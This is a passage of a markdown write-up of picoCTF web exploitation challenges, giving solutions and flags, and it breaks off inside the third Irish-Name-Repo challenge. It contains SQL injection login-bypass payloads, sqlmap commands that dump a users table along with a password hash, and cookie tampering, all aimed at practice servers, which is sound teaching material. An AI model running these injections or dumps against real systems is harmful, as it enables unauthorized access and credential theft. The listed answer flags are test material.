# [PicoCTF](./picoctf.md) PicoGym Web Exploitation

Web Exploitation entails the manipulation of websites and web hosted services using vulnerabilities in the interactive elements of a website.

## Contents

- [Useful References](#useful-references)
- [Insp3ct0r](#insp3ct0r)
- [logon](#logon)
- [where are the robots](#where-are-the-robots)
- [dont-use-client-side](#dont-use-client-side)
- [Web Gauntlet](#web-gauntlet)
- [picobrowser](#picobrowser)
- [Client-side-again](#client-side-again)
- [Irish-Name-Repo 1](#irish-name-repo-1)
- [Irish-Name-Repo 2](#irish-name-repo-2)
- [Irish-Name-Repo 3](#irish-name-repo-3)
- [JaWT Scratchpad](#jawt-scratchpad)
- [Java Script Kiddie](#java-script-kiddie)
- [Java Script Kiddie 2](#java-script-kiddie-2)


---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Useful References

| Link | Description |
|------|-------------|
| [robots exclusions file](https://en.wikipedia.org/wiki/Robots_exclusion_standard) | Robots Wikipedia page. |
| [web crawlers](https://en.wikipedia.org/wiki/Web_crawler). | Web Crawlers Wikipedia page. |
| [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) | SQL Injection Wikipedia page. |
| [beautifier.io](https://beautifier.io/) | Code formatting tool. |


---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Insp3ct0r

- Author: zaratec/danny
- 50 Points

### Description

Kishor Balan tipped us off that the following code may need inspection: https://jupiter.challenges.picoctf.org/problem/9670/ ([link](https://jupiter.challenges.picoctf.org/problem/9670/)) or http://jupiter.challenges.picoctf.org:9670

### Hints

1. How do you inspect web code on a browser?
2. There's 3 parts

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and inspect the source code:

~~~html
<!doctype html>
<html>
  <head>
    <title>My First Website :)</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
	<h1>Inspect Me</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">What</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">How</button>
      
      <div id="tabintro" class="tabcontent">
	<h3>What</h3>
	<p>I made a website</p>
      </div>

      <div id="tababout" class="tabcontent">
	<h3>How</h3>
	<p>I used these to make this site: <br/>
	  HTML <br/>
	  CSS <br/>
	  JS (JavaScript)
	</p>
	<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->
      </div>
      
    </div>
    
  </body>
</html>
~~~

This gives us the first part of the flag, "picoCTF{tru3_d3".  Inspecting the stylesheet, mycss.css, we can find the second part of the flag:

~~~css
div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: "Open Sans";
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */
~~~

Our flag is now "picoCTF{tru3_d3t3ct1ve_0r_ju5t".  We can also view the javascript source, myjs.js:

~~~js
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?2e7b23e3} */
~~~

This gives us the final part of the flag.  Our flag is complete: picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3}



</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## logon

- Author: bobson
- 100 points

### Description

The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? https://jupiter.challenges.picoctf.org/problem/44573/ ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

### Hints

1. Hmm it doesn't seem to check anyone's password, except for Joe's?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

For this challenge, we can inspect the source code:

~~~html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Factory Login</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation" class="active"><a href="/">Home</a>
                    </li>
                    <li role="presentation"><a href="/logout" class="btn btn-link pull-right">Sign Out</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Factory Login</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
      
      <div class="jumbotron">
        <p class="lead"></p>
        <div class="login-form">
            <form role="form" action="/login" method="post">
                <div class="form-group">
                    <input type="text" name="user" id="email" class="form-control input-lg" placeholder="Username">
                </div>
                <div class="form-group">
                    <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password">
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <input type="submit" class="btn btn-lg btn-success btn-block" value="Sign In">
                </div>
            </div>
        </form>
    </div>
    <footer class="footer">
        <p>&copy; PicoCTF 2019</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
~~~

We can login using any account.  The website does not seem to authenticate login details.  Afetr logging in we get the response:

~~~
Success: You logged in! Not sure you'll be able to see the flag though. 
~~~

and:

~~~
No flag for you
~~~

We can look at the cookies used for this site and see an admin cookie is set to False.

~~~
admin:"False"
~~~

We can change this cookie to True and reload the website.  We are now given the flag picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## where are the robots

- Author: zaratec/Danny
- 100 points

### Description

Can you find the robots? https://jupiter.challenges.picoctf.org/problem/56830/ ([link](https://jupiter.challenges.picoctf.org/problem/56830/)) or http://jupiter.challenges.picoctf.org:56830

### Hints

1. What part of the website could tell you where the creator doesn't want you to look?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge hints that the solution involves inspecting the [robots exclusions file](https://en.wikipedia.org/wiki/Robots_exclusion_standard).  This is a text file that specifies which components of the website should not be processed or scanned by [web crawlers](https://en.wikipedia.org/wiki/Web_crawler).

We can view the robots text file by entering "robots.txt" in the subdirectory.  The robots .txt file gives us:

~~~
User-agent: *
Disallow: /1bb4c.html
~~~

We can access this website and the following is displayed in the webpage:

~~~
Guess you found the robots
picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}
~~~

This gives us the flag picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{ca1cu1at1ng_Mach1n3s_1bb4c}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## dont-use-client-side

- Author: Alex Fulton/Danny
- 100 points

### Description

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/17682/ ([link](https://jupiter.challenges.picoctf.org/problem/17682/)) or http://jupiter.challenges.picoctf.org:17682

### Hints

1. Never trust the client

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can inspect the html source for this website:

~~~html
<html>
<head>
<title>Secure Login Portal</title>
</head>
<body bgcolor=blue>
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '706c') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_b') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == '5}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    }
    
  }
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:yellow">
<div style="text-align:center">
<p>This is the secure login portal</p>
<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>
~~~

We can see the password is authenticated in an inline javascript in the page.  We can reconstruct the password and retrieve the flag picoCTF{no_clients_plz_b706c5}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{no_clients_plz_b706c5}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Web Gauntlet

- Author: madStacks
- 200 points

### Description

Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:54319/ http://jupiter.challenges.picoctf.org:54319/filter.php

### Hints

1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite.
5. If your cookie keeps getting reset, try using a private browser window.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge is the first [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) challenge in picoCTF picoGym.  As given in the hints, the website uses SQLite. 

We can complete this challenge using only a browser and select inputs to the login form.  A subpage , filter.php, validates and sanitises the POST form input.

The first round, has username and password inputs and the filter.php provides:

~~~php
Round1: or
~~~

This shows us that the filter will block and OR statments submitted at index.php.

We can try test POST parameters in the login form with username=test and password=test we get a query string presented on index.php:

~~~
SELECT * FROM users WHERE username='test' AND password='test' 
~~~

We can use a SQLite cheat sheet at [atta.cked.me](http://atta.cked.me/home/sqlite3injectioncheatsheet).  The comments character is '--'.

Further details at [netsparker.com](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineComments) suggests that the username admin'-- will log us in as admin user by commenting out the password comparator.

We can enter into the form: username=admin'--, password=test.

This provides the query string:

~~~
SELECT * FROM users WHERE username='admin'--' AND password='test' 
~~~

We are now at round 2, the filter.php now shows:

~~~php
Round2: or and like = --
~~~

This filter will remove any "OR", "AND", "LIKE" "=" and "--" strings from our form inputs.  We cannot use the same inputs as before.

We can try using a comment block to break up the -- input, username=admin'-/*comment*/-, password=test however this does not work:

~~~
SELECT * FROM users WHERE username='admin'-/*break*/-' AND password='test' 
~~~

We get a html response: Invalid username/password.  Alternatively, we can stack the query with the aim of bypassingthe password query with username=admin';, password=test:

We get the following query string:

~~~
SELECT * FROM users WHERE username='admin';' AND password='test' 
~~~

And we are on to round 3.  The filter.php now shows:

~~~php
Round3: or and = like > < --
~~~

This is the same as before, but removes < and >.  We can try the same query as before, username=admin';, password=test:

~~~
SELECT * FROM users WHERE username='admin';' AND password='test' 
~~~

And we are in to round 4.  The filter now has:

~~~php
Round4: or and = like > < -- admin
~~~

This is removing the same as before, but in addition the string "admin".  The injection sheet has a concatenation statement '||' we can use this to split the username and attempt to bypass the filter, username=adm'||'in';, password=test:

~~~
SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
~~~

We are on to round 5.  php.filter:

~~~php
Round5: or and = like > < -- union admin
~~~

We can use the same form inputs as before, username=adm'||'in';, password=test:

~~~
SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
~~~

We are into round 6 and the filter.php now shows:

~~~php
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
?> 
~~~

We find the flag picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## picobrowser

- Author: Archit
- 200 points

### Description

This website can be rendered only by picobrowser, go and catch the flag! https://jupiter.challenges.picoctf.org/problem/28921/ ([link](https://jupiter.challenges.picoctf.org/problem/28921/)) or http://jupiter.challenges.picoctf.org:28921

### Hints

1. You don't need to download a new web browser.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

When connecting to a website, the [user agent](https://en.wikipedia.org/wiki/User_agent) is passed to the web server to adapt a website for optimisation to the clients browser.

This challenge suggests the flag is only available to picobrowser.  We therefore have to access the website whilst using a bespoke user agent "picobrowser".

We can inspect the website to locate the flag at https://jupiter.challenges.picoctf.org/problem/28921/flag and use curl to retrieve the flag:

~~~
$ curl -A "picobrowser" https://jupiter.challenges.picoctf.org/problem/28921/flag | grep pico
~~~

This returns:

~~~
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  2115  100  2115    0     0   2627      0 --:--:-- --:--:-- --:--:--  2627
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}</code></p>
~~~

This gives us the flag picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Client-side-again

- Author: Danny
- 200 points

### Description

Can you break into this super secure portal? https://jupiter.challenges.picoctf.org/problem/60786/ ([link](https://jupiter.challenges.picoctf.org/problem/60786/)) or http://jupiter.challenges.picoctf.org:60786

### Hints

1. What is obfuscation?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can inspect the website source again:

~~~html
<html>
<head>
<title>Secure Login Portal V2.0</title>
</head>
<body background="barbed_wire.jpeg" >
<!-- standard MD5 implementation -->
<script type="text/javascript" src="md5.js"></script>

<script type="text/javascript">
  var _0x5a46=['f49bf}','_again_e','this','Password\x20Verified','Incorrect\x20password','getElementById','value','substring','picoCTF{','not_this'];(function(_0x4bd822,_0x2bd6f7){var _0xb4bdb3=function(_0x1d68f6){while(--_0x1d68f6){_0x4bd822['push'](_0x4bd822['shift']());}};_0xb4bdb3(++_0x2bd6f7);}(_0x5a46,0x1b3));var _0x4b5b=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x5a46[_0x2d8f05];return _0x4d74cb;};function verify(){checkpass=document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];split=0x4;if(checkpass[_0x4b5b('0x2')](0x0,split*0x2)==_0x4b5b('0x3')){if(checkpass[_0x4b5b('0x2')](0x7,0x9)=='{n'){if(checkpass[_0x4b5b('0x2')](split*0x2,split*0x2*0x2)==_0x4b5b('0x4')){if(checkpass[_0x4b5b('0x2')](0x3,0x6)=='oCT'){if(checkpass[_0x4b5b('0x2')](split*0x3*0x2,split*0x4*0x2)==_0x4b5b('0x5')){if(checkpass['substring'](0x6,0xb)=='F{not'){if(checkpass[_0x4b5b('0x2')](split*0x2*0x2,split*0x3*0x2)==_0x4b5b('0x6')){if(checkpass[_0x4b5b('0x2')](0xc,0x10)==_0x4b5b('0x7')){alert(_0x4b5b('0x8'));}}}}}}}}else{alert(_0x4b5b('0x9'));}}
</script>
<div style="position:relative; padding:5px;top:50px; left:38%; width:350px; height:140px; background-color:gray">
<div style="text-align:center">
<p>New and Improved Login</p>

<p>Enter valid credentials to proceed</p>
<form action="index.html" method="post">
<input type="password" id="pass" size="8" />
<br/>
<input type="submit" value="verify" onclick="verify(); return false;" />
</form>
</div>
</div>
</body>
</html>
~~~

There is an inline javascript code that authenticates the password.  We can use [beautifier.io](https://beautifier.io/) to format the javascript:

~~~js
(function(_0x4bd822, _0x2bd6f7) {
    var _0xb4bdb3 = function(_0x1d68f6) {
        while (--_0x1d68f6) {
            _0x4bd822['push'](_0x4bd822['shift']());
        }
    };
    _0xb4bdb3(++_0x2bd6f7);
}(_0x5a46, 0x1b3));
var _0x4b5b = function(_0x2d8f05, _0x4b81bb) {
    _0x2d8f05 = _0x2d8f05 - 0x0;
    var _0x4d74cb = _0x5a46[_0x2d8f05];
    return _0x4d74cb;
};

function verify() {
    checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
    split = 0x4;
    if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
        if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
            if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
                if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
                    if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
                        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
                            if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
                                if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
                                    alert(_0x4b5b('0x8'));
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        alert(_0x4b5b('0x9'));
    }
}
~~~

</details>

This can be deconstructed to reveal the flag picoCTF{not_this_again_ef49bf}.

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{not_this_again_ef49bf}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 1

- Author: Chris Hensler
- 300 points

### Description

There is a website running at https://jupiter.challenges.picoctf.org/problem/39720/ ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

### Hints

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge presents a webpage with a login subpage, login.html.  This webpage has a form to submit username and password details for login as site administrator.

The hints suggest that there is a backend database so this website is likely exploitable using SQL injection.

We can use [sqlmap](http://sqlmap.org/) to identify the database type and data fields:

~~~
$ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
~~~

We pass the url using the "-u" flag.  "--forms" tells sqlmap that the SQL database is accessed via a html form and --batch automate the user inputs to allow sqlmap to run autonomously.  "-f" tells sqlmap to perform an extensive DBMS version fingerprint.

We get the following response:

~~~
         ___
       __H__                                                                 
 ___ ___[)]_____ ___ ___  {1.5.2#stable}                                     
|_ -| . [(]     | .'| . |                                                    
|___|_  [.]_|_|_|__,|  _|                                                    
      |_|V...       |_|   http://sqlmap.org                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:34:11 /2021-03-13/

[10:34:11] [INFO] testing connection to the target URL
got a 301 redirect to 'https://jupiter.challenges.picoctf.org/problem/39720/login.html'. Do you want to follow? [Y/n] Y
[10:34:12] [INFO] searching for forms
[#1] form:
POST https://jupiter.challenges.picoctf.org/problem/39720/login.php
POST data: username=&password=&debug=0
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=&debug=0] (Warning: blank fields detected): username=&password=&debug=0
do you want to fill blank fields with random values? [Y/n] Y
[10:34:13] [INFO] using '/home/djm89uk/.local/share/sqlmap/output/results-03132021_1034am.csv' as the CSV results file in multiple targets mode           
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=cBuM' OR NOT 3901=3901-- zTuF&password=&debug=0

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query)
    Payload: username=cBuM' OR 2049=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- RKpb&password=&debug=0
---
do you want to exploit this SQL injection? [Y/n] Y
[10:34:13] [INFO] testing SQLite
[10:34:14] [INFO] confirming SQLite
[10:34:14] [INFO] actively fingerprinting SQLite
[10:34:14] [INFO] the back-end DBMS is SQLite
web application technology: Nginx
back-end DBMS: active fingerprint: SQLite 3
[10:34:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/djm89uk/.local/share/sqlmap/output/results-03132021_1034am.csv'    
~~~

This response identifies the back-end database uses [SQLite 3](https://sqlite.org/version3.html):

~~~
back-end DBMS: active fingerprint: SQLite 3
~~~

and the web application uses [Nginx](https://www.nginx.com/):

~~~
web application technology: Nginx
~~~

Reviewing the [sqlmap man page](http://manpages.org/sqlmap), we can rerun the sqlmap with the flag --dbms=SQLite.  This forces the sqlmap detection techniques to use SQLite only and reduces the number of operations.  We can use a few further flags to expand our queries.  --threads=10 runs sqlmap with 10 multiple concurrent threads, --tables tells sqlmap to retrieve tables from the DB.  We also pass the flag --random-agent, this changes the HTTP User-Agent to a browser instead of sqlmap.

~~~
$ sqlmap --dbms=SQLite --forms --batch --tables --random-agent --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html" 
~~~

The response provides the following table users:

~~~
<current>
[1 table]
+-------+
| users |
+-------+
~~~

We now know that the DB has a users table, in which the login details are likely held.  We can rerun sqlmap with the flag -T users, to focus on the users table.  Adding --dump, tells sqlmap to grab all of the data from the table:

~~~
$ sqlmap --dbms=SQLite --forms --batch -T users --dump --threads=10 -u "http://jupiter.challenges.picoctf.org/problem/39720/login.html"
~~~

We get the following response:

~~~
Database: <current>
Table: users
[1 entry]
+-------+-------+--------------------------------------------------------------------+
| name  | admin | password                                                           |
+-------+-------+--------------------------------------------------------------------+
| admin | 1     | pbkdf2:sha1:1000$bTY1abU0$5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde |
+-------+-------+--------------------------------------------------------------------+
~~~

We can see the table users, has 1 entry with name "admin", given binary value 1 for admin field and password "pbkdf2:sha1:1000$bTY1abU0$5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde".

The password string provides details on how the password is hashed.  [pbkdf2](https://en.wikipedia.org/wiki/PBKDF2) is Password-Based Key Derivation Function 2. [SHA1](https://en.wikipedia.org/wiki/SHA-1), Secure Hashing Algorithm 1. "1000$" is the number of iterations used when hashing, and "bTY1abU0$" is the salt:

| Parameter | Value |
|-----------|-------|
| Key Function | PBKDF2 |
| Hashing Algorithm | SHA1 |
| Iterations | 1000 |
| Salt (ASCII) | bTY1abU0 |
| Salt (Hex) | 6254593161625530 |
| Hashed Password (Hex) | 5503ae46ff1a45b14ff19d5a2ae08acf1d2aacde |

We can attempt to identify the password using a hash reverse lookup tool such as [crackstation.net](https://crackstation.net/).  This does not provide an answer.

We can attempt direct [SQLite 3 injection](http://atta.cked.me/home/sqlite3injectioncheatsheet) using the same commands we used in the WebGauntlet challenge.

We can view the SQL query using curl:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=test&password=test&debug=1"
~~~

We get a response:

~~~
<pre>username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre><h1>Login failed.</h1>  
~~~

The SQL query is:

~~~sql
SELECT * FROM users WHERE name='test' AND password='test'
~~~

We know the username in the users table is admin, we can attempt a simple OR input into the password:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/39720/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
~~~

We get the response:

~~~
<pre>username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p> 
~~~

This gives us the flag, picoCTF{s0m3_SQL_c218b685}.


</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{s0m3_SQL_c218b685}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 2

- Author: Xingyang Pan
- 350 points

### Description

There is a website running at https://jupiter.challenges.picoctf.org/problem/52849/ ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

### Hints

1. The password is being filtered.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Using sqlmap, we can identify the DBMS:

~~~
$ sqlmap --forms --batch -f -u "http://jupiter.challenges.picoctf.org/problem/52849/login.html"
~~~

This does not return any details of the DBMS.  We therefore cannot identify the tables or records held in the db.

Assuming a similar users table used in the previous challenge, we can test the website with curl:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=test&password=test&debug=1"
<pre>username: test
password: test
SQL query: SELECT * FROM users WHERE name='test' AND password='test'
</pre><h1>Login failed.</h1>     
~~~

We get the SQL query:

~~~sql
SELECT * FROM users WHERE name='test' AND password='test'
~~~

Attempting an OR statement on the password as in the previous challenge we get:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin&password=' OR 1=1--&debug=1"
<pre>username: admin
password: ' OR 1=1--
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1--'
</pre><h1>SQLi detected.</h1>     
~~~

We can see SQLite is used. However we were unable to get in with the OR statement. We can try again, by entering a comment string into the username field:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/52849/login.php" --data "username=admin'--&password=test&debug=1"
<pre>username: admin'--
password: test
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='test'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>                                          
~~~

We get the flag picoCTF{m0R3_SQL_plz_fa983901}.


</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{m0R3_SQL_plz_fa983901}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Irish-Name-Repo 3

- Author: Xingyang Pan
- 400 points

### Description

There is a secure website running at https://jupiter.challenges.picoctf.org/problem/29132/ ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

### Hints

1. Seems like the password is encrypted.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This is another SQL injection challenge.  Inspecting the login html page:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.html"
~~~

We get the html webpage:

~~~html
<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
